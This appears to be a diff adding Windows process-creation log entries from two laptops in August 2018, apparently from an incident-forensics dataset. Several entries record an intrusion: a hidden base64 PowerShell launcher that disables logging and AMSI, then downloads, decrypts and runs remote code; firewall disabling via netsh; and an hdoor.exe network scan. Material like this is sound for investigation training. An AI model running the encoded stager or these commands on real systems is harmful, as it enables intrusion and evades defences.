+"2018-08-20T11:46:29.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x2488
+	New Process Name:	C:\Windows\System32\netsh.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\system32\netsh.exe"" advfirewall set allprofiles state off
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:43:10.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x2814
+	New Process Name:	C:\Windows\Temp\hdoor.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\windows\temp\hdoor.exe"" -hbs 192.168.9.1-192.168.9.50 /b /m /n
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:41:46.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x2a14
+	New Process Name:	C:\Windows\System32\NETSTAT.EXE
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\system32\NETSTAT.EXE"" -an
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:40:57.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x25f0
+	New Process Name:	C:\Windows\System32\NETSTAT.EXE
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\system32\NETSTAT.EXE"" -an
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:33:16.000+0100","BGIST-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\BruceGist
+	Account Name:		BruceGist
+	Account Domain:		AzureAD
+	Logon ID:		0xB6DA4
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1cdc
+	New Process Name:	C:\Windows\System32\conhost.exe
+	Token Elevation Type:	%%1938
+	Mandatory Label:		Mandatory Label\Medium Mandatory Level
+	Creator Process ID:	0x2348
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:33:16.000+0100","BGIST-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\BruceGist
+	Account Name:		BruceGist
+	Account Domain:		AzureAD
+	Logon ID:		0xB6DA4
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x2348
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1938
+	Mandatory Label:		Mandatory Label\Medium Mandatory Level
+	Creator Process ID:	0x2f30
+	Creator Process Name:	C:\Users\BruceGist\AppData\Roaming\Dropbox\Client_53.4.67\Dropbox.exe
+	Process Command Line:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell ""Get-AppxProvisionedPackage -Online | Where-Object DisplayName -In \""C27EB4BA.DropboxOEM\"" | Remove-ProvisionedAppxPackage -Online""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:33:12.000+0100","BGIST-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\BruceGist
+	Account Name:		BruceGist
+	Account Domain:		AzureAD
+	Logon ID:		0xB6DA4
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1850
+	New Process Name:	C:\Windows\System32\conhost.exe
+	Token Elevation Type:	%%1938
+	Mandatory Label:		Mandatory Label\Medium Mandatory Level
+	Creator Process ID:	0xa10
+	Creator Process Name:	C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:33:12.000+0100","BGIST-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\BruceGist
+	Account Name:		BruceGist
+	Account Domain:		AzureAD
+	Logon ID:		0xB6DA4
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xa10
+	New Process Name:	C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1938
+	Mandatory Label:		Mandatory Label\Medium Mandatory Level
+	Creator Process ID:	0x2f30
+	Creator Process Name:	C:\Users\BruceGist\AppData\Roaming\Dropbox\Client_53.4.67\Dropbox.exe
+	Process Command Line:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell ""Get-AppxPackage C27EB4BA.DropboxOEM | Remove-AppxPackage""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:16:53.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1b0c
+	New Process Name:	C:\Windows\System32\schtasks.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\system32\schtasks.exe"" /Delete /TN Updater /F
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:16:39.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		AzureAD\FyodorMalteskesko
+	Account Name:		FyodorMalteskesko
+	Account Domain:		AzureAD
+	Logon ID:		0x1091C98
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1dfc
+	New Process Name:	C:\Windows\System32\whoami.exe
+	Token Elevation Type:	%%1937
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x18d8
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\system32\whoami.exe""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:15:27.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		FYODOR-L$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xeb0
+	New Process Name:	C:\Windows\System32\conhost.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x28c0
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:15:27.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		FYODOR-L$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x28c0
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x1220
+	Creator Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe
+	Process Command Line:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAG8ATgBUAGEAQgBsAGUALgBQAFMAVgBlAHIAcwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBlAEYAXQAuAEEAcwBTAEUAbQBiAEwAWQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAVABWAEEATAB1AEUAKAAkAE4AdQBMAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAGUAQwBUAEkAbwBuAHMALgBHAGUAbgBFAHIAaQBjAC4ARABJAEMAVABpAG8ATgBhAFIAeQBbAHMAdAByAEkATgBHACwAUwB5AFMAdABlAG0ALgBPAEIASgBlAGMAVABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAVgBhAGwALgBBAEQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEATAB9AEUATABTAGUAewBbAFMAQwBSAEkAcABUAEIAbABvAGMAawBdAC4AIgBHAEUAVABGAGkARQBgAEwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAFQAVgBhAEwAVQBlACgAJABuAHUATABsACwAKABOAGUAdwAtAE8AQgBqAEUAYwBUACAAQwBvAGwAbABlAGMAdABpAE8ATgBTAC4ARwBlAE4ARQByAEkAYwAuAEgAYQBTAGgAUwBlAHQAWwBzAHQAcgBJAG4AZwBdACkAKQB9ACQAUgBFAEYAPQBbAFIARQBmAF0ALgBBAFMAcwBFAG0AYgBsAHkALgBHAEUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApADsAJABSAEUARgAuAEcARQB0AEYAaQBFAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAVQBlACgAJABuAFUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAcwBUAGUATQAuAE4AZQB0AC4AUwBFAFIAdgBJAEMAZQBQAG8AaQBuAFQATQBhAG4AYQBHAGUAcgBdADoAOgBFAFgAUABlAEMAVAAxADAAMABDAE8AbgBUAGkATgB1AGUAPQAwADsAJAB3AGMAPQBOAEUAVwAtAE8AQgBKAEUAYwB0ACAAUwB5AFMAVABlAG0ALgBOAGUAdAAuAFcAZQBCAEMAbABpAGUAbgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAkAHcAYwAuAEgARQBBAGQAZQBSAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAEgAZQBBAGQARQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAUgBvAHgAeQA9AFsAUwB5AHMAVABlAG0ALgBOAEUAdAAuAFcAZQBCAFIARQBRAFUARQBTAFQAXQA6ADoARABlAEYAQQBVAEwAVABXAGUAYgBQAHIAbwB4AFkAOwAkAHcAYwAuAFAAUgBPAFgAWQAuAEMAUgBlAGQAZQBOAFQASQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBEAEUAbgBUAEkAQQBsAEMAYQBDAGgARQBdADoAOgBEAGUAZgBBAFUATAB0AE4AZQB0AHcAbwByAEsAQwByAEUARABFAE4AVABJAGEAbABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAdABFAE0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAWQBUAGUAUwAoACcAMQBBAEIAPABZAGsANgBaADQAIwArAHYAVgB1ACUAbwA1AH0AOAAmAE0ALQA5AFUATAB+AGwAfAA+ADAAZwBQACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAkACgAWwBUAEUAeABUAC4ARQBuAGMAbwBEAGkAbgBnAF0AOgA6AFUATgBpAGMAbwBkAEUALgBHAEUAdABTAHQAUgBpAE4ARwAoAFsAQwBPAE4AVgBFAFIAVABdADoAOgBGAFIATwBNAEIAYQBTAGUANgA0AFMAdABSAEkATgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAFEAQQBOAFEAQQB1AEEARABjAEEATgB3AEEAdQBBAEQAVQBBAE0AdwBBAHUAQQBEAEUAQQBOAHcAQQAyAEEARABvAEEATgBBAEEAMABBAEQATQBBACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAFcAYwAuAEgAZQBBAGQARQByAHMALgBBAGQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAUAB0AGgAQQBWAGcAcwA9AEcAMwBkAHEAbgBoAHIAOQBNAC8AdgBzAFIAWgBvAHMASwBRAFEASAAxAEgAcABEAHoARwBnAD0AIgApADsAJABEAEEAdABBAD0AJAB3AEMALgBEAG8AdwBuAGwATwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAFQAKQA7ACQAaQBWAD0AJABkAEEAVABBAFsAMAAuAC4AMwBdADsAJABEAGEAdABhAD0AJABkAEEAVABhAFsANAAuAC4AJABEAGEAdABBAC4AbABFAE4ARwBUAEgAXQA7AC0ASgBvAGkAbgBbAEMAaABhAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:11:40.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		FYODOR-L$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x2938
+	New Process Name:	C:\Windows\System32\whoami.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x1548
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	""C:\Windows\system32\whoami.exe""
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:11:00.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		FYODOR-L$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x143c
+	New Process Name:	C:\Windows\System32\conhost.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x1548
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
+"2018-08-20T11:11:00.000+0100","FYODOR-L",4688,"A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		FYODOR-L$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1548
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x460
+	Creator Process Name:	C:\Windows\System32\svchost.exe
